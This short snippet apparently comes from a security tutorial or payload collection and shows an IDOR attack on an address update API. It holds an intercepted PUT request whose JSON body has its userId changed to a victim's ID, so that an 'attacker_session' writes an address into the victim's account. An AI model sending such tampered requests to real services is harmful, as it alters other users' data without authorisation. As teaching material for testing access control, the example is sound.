# Example 2: IDOR in Address Update Endpoint

```
# Intercept address update request
PUT /api/addresses/5/update HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{
  "id": 5,
  "userId": 1001,
  "street": "123 Main St",
  "city": "Test City"
}

# Modify userId to victim's ID
{
  "id": 5,
  "userId": 1000,  # Changed from 1001
  "street": "Hacked Address",
  "city": "Exploit City"
}

# If 200 OK: Address created under victim's account
```